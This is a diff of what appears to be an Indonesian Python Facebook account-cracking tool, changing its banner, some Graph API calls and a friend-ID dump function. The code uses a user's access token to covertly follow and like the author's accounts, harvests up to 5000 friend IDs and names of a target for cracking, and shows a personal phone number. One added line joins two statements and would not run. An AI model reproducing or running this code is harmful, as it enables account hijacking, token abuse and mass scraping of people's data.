@@ -90,13 +90,15 @@ def clear():
 def back():
 	login()
 def banner():
-	clear()
-	wel = '➣ 𝑺𝑬𝑳𝑨𝑴𝑨𝑻 𝑫𝑨𝑻𝑨𝑵𝑮 𝑫𝑰 𝑻𝑶𝑶𝑳𝑺 𝑲𝑨𝑴𝑰'
-	wel2 = mark(wel, style='cyan')
-	sol().print(wel2)
-	au='𝑮𝒊𝒕𝒉𝒖𝒃 : 𝒉𝒕𝒕𝒑𝒔://𝒈𝒊𝒕𝒉𝒖𝒃.𝒄𝒐𝒎/𝑺𝒓𝒕𝒗-𝑩𝑶𝑻\n𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : 𝑻𝒆𝒅𝒅𝒚 𝑪𝒂𝒉𝒚𝒐 𝑷𝒖𝒕𝒓𝒂 𝑷𝒂𝒏𝒈𝒆𝒎𝒃𝒂𝒓𝒂\n𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑 : 𝟎𝟖𝟐𝟐𝟗𝟎𝟖𝟖𝟓𝟐𝟎𝟒\n𝑰𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎 : 𝑻𝒆𝒅𝒅𝒚𝒚𝒚𝒚_𝟏𝟏\n𝑻𝒐𝒐𝒍𝒔 : 𝑩𝒆𝒍𝒖𝒎 𝑷𝒓𝒆𝒎𝒊𝒖𝒎'
-	pengembang1=nel(au,style="green")
-	cetak(nel(pengembang1, title='𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐓𝐎𝐎𝐋𝐒'))
+	print('''%s
+_______  ______ _______ _______ _     _ _______  ______
+|       |_____/ |_____| |       |____/  |______ |_____/
+|_____  |    \_ |     | |_____  |    \_ |______ |    \_
+───────────────────────────────────────────────────────
+ [\x1b[1;96m+%s] Author   : Strovmirviaska
+ [\x1b[1;96m+%s] Github   : https://github.com/Strv-BOT
+ [\x1b[1;96m+%s] Facebook : Teddy Cahyo Putra Pnagembara
+───────────────────────────────────────────────────────\n'''%(N,N,N,N))
 
 def memek():
 	kontol()
@@ -153,7 +155,7 @@ def bot():
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
-		requests.post('https://graph.facebook.com/711894139936601likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
 		requests.post('https://graph.facebook.com/5222521057807512/likes?summary=true&access_token=' + toket)
 		menu_test()
 		
@@ -184,7 +186,7 @@ def krekefbi():
 	jalan(' \33[1;32m[04] 𝑪𝒉𝒆𝒄𝒌 𝑶𝒑𝒔𝒊 𝑯𝒂𝒔𝒊𝒍 𝑪𝒉𝒆𝒄𝒌𝒑𝒐𝒊𝒏𝒕')
 	jalan(' \33[1;32m[05] 𝑪𝒆𝒌 𝑯𝒂𝒔𝒊𝒍 𝑪𝒓𝒂𝒄𝒌 𝑶𝑲/𝑪𝑷')
 	jalan(' \33[1;32m[00] 𝑬𝒙𝒊𝒕') 
-	badag = input('➣ 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑷𝒊𝒍𝒊𝒉. :  ')
+	badag = input('➣ 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑷𝒊𝒍𝒊𝒉 :  ')
 	if badag in ['1','01']:
 		jancok()
 	elif badag in ['2','02']:
@@ -411,7 +413,7 @@ def dump_publik():
 	print('\033[33m➣ 𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
 	pil = input('\033[33m➣ 𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑰𝑫 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : ')
 	try:
-		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
@@ -426,7 +428,7 @@ def dump_publik():
 		teks = '➣ 𝑷𝒆𝒓𝒕𝒆𝒎𝒂𝒏𝒂𝒏 𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑨𝒕𝒂𝒖 𝑻𝒐𝒌𝒆𝒏 𝑹𝒖𝒔𝒂𝒌'
 		teks2 = mark(teks, style='red')
 		sol().print(teks2)
-		login_lagi()
+		sleep(4)login_lagi()
 
 def dump_massal():
 	win = ' 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌 𝑴𝒂𝒔𝒔𝒂𝒍'
